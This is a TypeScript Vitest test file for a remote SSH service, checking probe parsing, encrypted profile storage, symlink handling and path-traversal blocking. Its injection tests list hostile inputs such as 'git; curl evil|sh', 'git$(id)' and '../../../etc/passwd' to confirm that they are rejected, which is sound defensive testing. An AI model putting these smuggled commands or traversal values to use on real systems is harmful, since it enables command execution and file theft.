import { describe, expect, it } from "vitest";
import { promises as fs } from "node:fs";
import os from "node:os";
import path from "node:path";
import { PassThrough, Readable } from "node:stream";
import {
	expandHome,
	RemoteSshService,
	resolveRemoteWorkspacePath,
	serveRemoteWorkspaceFile,
	setGlobalRemoteSshService,
} from "../../server/remote-ssh-service.js";
import { probePresentItem } from "../../server/present-files-tool.js";

describe("RemoteSshService", () => {
	it("expandHome correctly expands home directory", () => {
		expect(expandHome(undefined)).toBeUndefined();
		expect(expandHome("")).toBe("");
		expect(expandHome("~")).toBe(os.homedir());
		expect(expandHome("~/foo/bar")).toBe(path.join(os.homedir(), "foo/bar"));
		expect(expandHome("/var/log")).toBe("/var/log");
	});

	it("parseProbeOutput parses full system and tools", () => {
		const svc = new RemoteSshService(os.tmpdir());
		const mockOutput = `
===SYSTEM===
Linux
x86_64
my-ubuntu-server
ubuntu
/home/ubuntu
===GIT===
/usr/bin/git
git version 2.34.1
===NODE===
/usr/bin/node
v20.11.0
===BASH===
/bin/bash
GNU bash, version 5.1.16(1)-release (x86_64-pc-linux-gnu)
===PYTHON===
/usr/bin/python3
Python 3.10.12
===PKG===
apt-get
`;

		// @ts-expect-error accessing private method for unit testing
		const parsed = svc.parseProbeOutput(mockOutput);

		expect(parsed.system.os).toBe("Linux");
		expect(parsed.system.arch).toBe("x86_64");
		expect(parsed.system.hostname).toBe("my-ubuntu-server");
		expect(parsed.system.user).toBe("ubuntu");
		expect(parsed.system.homeDir).toBe("/home/ubuntu");

		expect(parsed.tools.git.installed).toBe(true);
		expect(parsed.tools.git.version).toContain("git version 2.34.1");

		expect(parsed.tools.node.installed).toBe(true);
		expect(parsed.tools.node.version).toContain("v20.11.0");

		expect(parsed.tools.bash.installed).toBe(true);
		expect(parsed.tools.bash.path).toBe("/bin/bash");

		expect(parsed.packageManager).toBe("apt-get");
		expect(parsed.suggestedInstall).toEqual([]);
	});

	it("parseProbeOutput detects missing git and bash and suggests installation", () => {
		const svc = new RemoteSshService(os.tmpdir());
		const mockOutput = `
===SYSTEM===
Linux
aarch64
minimal-alpine
root
/root
===GIT===
NONE
===NODE===
NONE
===BASH===
NONE
===PYTHON===
NONE
===PKG===
apk
`;

		// @ts-expect-error accessing private method for unit testing
		const parsed = svc.parseProbeOutput(mockOutput);

		expect(parsed.system.os).toBe("Linux");
		expect(parsed.system.arch).toBe("aarch64");
		expect(parsed.tools.git.installed).toBe(false);
		expect(parsed.tools.node.installed).toBe(false);
		expect(parsed.tools.bash.installed).toBe(false);
		expect(parsed.packageManager).toBe("apk");
		expect(parsed.suggestedInstall).toContain("git");
		expect(parsed.suggestedInstall).toContain("bash");
	});

	it("saves and manages profiles securely without leaking plaintext credentials", async () => {
		const testDataDir = path.join(os.tmpdir(), `pi-web-ssh-test-${Date.now()}-${Math.random().toString(36).slice(2)}`);
		await fs.mkdir(testDataDir, { recursive: true });

		try {
			const svc = new RemoteSshService(testDataDir);

			// 保存 profile，包含明文密码
			await svc.saveProfile("test-server", {
				host: "1.2.3.4",
				port: 2222,
				username: "developer",
				auth: {
					type: "password",
					password: "super-secret-password-12345",
				},
			});

			// 检查 profiles 列表
			const profiles = await svc.listProfiles();
			expect(profiles).toHaveLength(1);
			expect(profiles[0].name).toBe("test-server");
			expect(profiles[0].host).toBe("1.2.3.4");
			expect(profiles[0].port).toBe(2222);
			expect(profiles[0].username).toBe("developer");
			expect(profiles[0].authType).toBe("password");
			// 密码绝对不能在 Summary 中返回
			expect((profiles[0] as any).password).toBeUndefined();

			// 检查磁盘落盘文件，必须是加密的密文，绝对不能包含明文密码
			const diskRaw = await fs.readFile(path.join(testDataDir, "ssh-profiles.json"), "utf8");
			expect(diskRaw).not.toContain("super-secret-password-12345");
			expect(diskRaw).toContain("encryptedPassword");

			// 删除 profile
			await svc.deleteProfile("test-server");
			const profilesAfter = await svc.listProfiles();
			expect(profilesAfter).toHaveLength(0);
		} finally {
			await fs.rm(testDataDir, { recursive: true, force: true }).catch(() => {});
		}
	});
});

describe("installTools 工具名注入防护（0.103 审计）", () => {
	it("shell 元字符直接拒绝，不触达连接与远端 shell", async () => {
		const svc = new RemoteSshService(os.tmpdir());
		for (const bad of ["git; curl evil|sh", "git$(id)", "git`id`", "git & reboot", "../../etc", "git\ncurl"]) {
			const r = await svc.installTools("no-such-connection", [bad]);
			expect(r.ok).toBe(false);
			expect(r.error).toContain("非法的工具名");
		}
	});

	it("合法工具名放行到连接层（未知连接按原样抛连接错误）", async () => {
		const svc = new RemoteSshService(os.tmpdir());
		await expect(svc.installTools("no-such-connection", ["git"])).rejects.toThrowError("连接已断开或不存在");
	});
});

describe("listDir 软链接目录识别与 ~ 路径展开", () => {
	it("跟随符号链接判断目录并展开 ~/ 路径", async () => {
		const svc = new RemoteSshService(os.tmpdir());
		const mockSftp = {
			readdir: (targetPath: string, cb: (err: Error | null, list?: any[]) => void) => {
				expect(targetPath).toBe("/home/k");
				cb(null, [
					{
						filename: "data",
						attrs: {
							isDirectory: () => false,
							isSymbolicLink: () => true,
							size: 12,
							mtime: 1700000000,
						},
					},
					{
						filename: "broken-link",
						attrs: {
							isDirectory: () => false,
							isSymbolicLink: () => true,
							size: 8,
							mtime: 1700000000,
						},
					},
					{
						filename: "readme.md",
						attrs: {
							isDirectory: () => false,
							isSymbolicLink: () => false,
							size: 100,
							mtime: 1700000000,
						},
					},
				]);
			},
			stat: (fullPath: string, cb: (err: Error | null, stats?: any) => void) => {
				if (fullPath === "/home/k/data") {
					cb(null, { isDirectory: () => true, isFile: () => false });
				} else {
					cb(new Error("No such file"));
				}
			},
		};

		// 注入模拟存活连接
		// @ts-expect-error testing internal connection map
		svc.connections.set("conn-1", {
			id: "conn-1",
			hostKey: "k@pro6000d:22",
			client: {} as any,
			sftp: mockSftp as any,
			params: { host: "pro6000d", port: 22, username: "k", auth: { type: "key" } },
			system: { os: "Linux", arch: "x86_64", hostname: "k", user: "k", homeDir: "/home/k" },
			alive: true,
			timer: setTimeout(() => {}, 60000),
		});

		const res = await svc.listDir("conn-1", "~");
		// @ts-expect-error cleanup timer
		clearTimeout(svc.connections.get("conn-1")?.timer);

		expect(res.ok).toBe(true);
		expect(res.path).toBe("/home/k");
		const dataItem = res.items.find((i) => i.name === "data");
		expect(dataItem?.type).toBe("dir");
		expect(dataItem?.path).toBe("/home/k/data");

		const brokenItem = res.items.find((i) => i.name === "broken-link");
		expect(brokenItem?.type).toBe("file");
	});
});

describe("serveRemoteWorkspaceFile 与 present_files 远程工作区支持", () => {
	function createMockRes() {
		const pt = new PassThrough();
		const chunks: Buffer[] = [];
		pt.on("data", (c) => chunks.push(Buffer.from(c)));
		let statusCode = 200;
		const headers: Record<string, string> = {};
		let endedBody = "";
		const origEnd = pt.end.bind(pt);
		(pt as any).status = (code: number) => {
			statusCode = code;
			return pt;
		};
		(pt as any).setHeader = (k: string, v: string) => {
			headers[k.toLowerCase()] = v;
		};
		(pt as any).type = (_name: string) => {};
		(pt as any).end = (chunk?: any) => {
			if (typeof chunk === "string") endedBody = chunk;
			else if (Buffer.isBuffer(chunk)) chunks.push(chunk);
			return origEnd(chunk);
		};
		return {
			res: pt as any,
			getStatus: () => statusCode,
			getHeaders: () => headers,
			getBody: () => (chunks.length > 0 ? Buffer.concat(chunks).toString("utf8") : endedBody),
		};
	}

	it("支持远程工作区文件 HTTP 下载（相对路径与绝对路径）并拦截越界路径", async () => {
		const remoteUri = "ssh://k@pro6000d:22/data/spare/project";
		const fileContent = "# Benchmark Report\nAll tests passed!";
		const mockSvc = {
			sftpStat: async (_uri: string, remoteAbs: string) => {
				if (remoteAbs === "/data/spare/project/report.md" || remoteAbs === "/data/models/config.json") {
					return { isDirectory: false, isFile: true, size: Buffer.byteLength(fileContent), mtime: 1700000000000 };
				}
				throw new Error("ENOENT");
			},
			sftpCreateReadStream: async (_uri: string, _remoteAbs: string, opts?: { start?: number; end?: number }) => {
				const buf = Buffer.from(fileContent, "utf8");
				const slice =
					opts?.start !== undefined || opts?.end !== undefined
						? buf.subarray(opts?.start ?? 0, opts?.end !== undefined ? opts.end + 1 : undefined)
						: buf;
				return Readable.from(slice);
			},
			sftpReadFile: async (_uri: string, _remoteAbs: string, maxBytes?: number) => {
				const buf = Buffer.from(fileContent, "utf8");
				return { data: maxBytes ? buf.subarray(0, maxBytes) : buf, size: buf.length };
			},
		} as unknown as RemoteSshService;

		// 1. 相对路径下载
		const m1 = createMockRes();
		await serveRemoteWorkspaceFile(
			{ headers: {}, query: { download: "1" } },
			m1.res,
			remoteUri,
			"report.md",
			{ isDownload: true, allowAllTypes: false },
			mockSvc,
		);
		expect(m1.getStatus()).toBe(200);
		expect(m1.getHeaders()["content-disposition"]).toContain("report.md");
		expect(m1.getBody()).toBe(fileContent);

		// 2. 绝对路径下载
		const m2 = createMockRes();
		await serveRemoteWorkspaceFile(
			{ headers: {}, query: { download: "1" } },
			m2.res,
			remoteUri,
			"/data/models/config.json",
			{ isDownload: true, allowAllTypes: false },
			mockSvc,
		);
		expect(m2.getStatus()).toBe(200);
		expect(m2.getHeaders()["content-disposition"]).toContain("config.json");
		expect(m2.getBody()).toBe(fileContent);

		// 3. 越界相对路径拦截
		const m3 = createMockRes();
		await serveRemoteWorkspaceFile(
			{ headers: {}, query: { download: "1" } },
			m3.res,
			remoteUri,
			"../../../etc/passwd",
			{ isDownload: true, allowAllTypes: false },
			mockSvc,
		);
		expect(m3.getStatus()).toBe(400);
		expect(m3.getBody()).toBe("path outside workspace");

		// 4. present_files 工具在远程工作区下正常探测文件与摘录
		setGlobalRemoteSshService(mockSvc);
		try {
			const item = await probePresentItem({ path: "report.md" }, remoteUri, { left: 1000 });
			expect(item.kind).toBe("markdown");
			expect(item.abs).toBe("/data/spare/project/report.md");
			expect(item.excerpt).toContain("Benchmark Report");
		} finally {
			setGlobalRemoteSshService(null as any);
		}
	});

	it("resolveRemoteWorkspacePath unwraps ssh:// URIs cleanly without nested prefixes", () => {
		const root = "/root/workspace/ljz";
		// 1. 完整的 ssh:// URI 指向工作区根
		const res1 = resolveRemoteWorkspacePath(root, "ssh://root@39.99.235.208:22/root/workspace/ljz");
		expect(res1).toEqual({ abs: "/root/workspace/ljz", rel: "" });

		// 2. 完整的 ssh:// URI 指向子目录
		const res2 = resolveRemoteWorkspacePath(root, "ssh://root@39.99.235.208:22/root/workspace/ljz/subfolder");
		expect(res2).toEqual({ abs: "/root/workspace/ljz/subfolder", rel: "subfolder" });

		// 3. 相对路径
		const res3 = resolveRemoteWorkspacePath(root, "nested/file.txt");
		expect(res3).toEqual({ abs: "/root/workspace/ljz/nested/file.txt", rel: "nested/file.txt" });

		// 4. 空字符串与点
		expect(resolveRemoteWorkspacePath(root, "")).toEqual({ abs: "/root/workspace/ljz", rel: "" });
		expect(resolveRemoteWorkspacePath(root, ".")).toEqual({ abs: "/root/workspace/ljz", rel: "" });

		// 5. 跨界 ssh:// URI 拦截
		const resOutside = resolveRemoteWorkspacePath(root, "ssh://root@39.99.235.208:22/etc/passwd");
		expect(resOutside).toBeNull();
	});
});
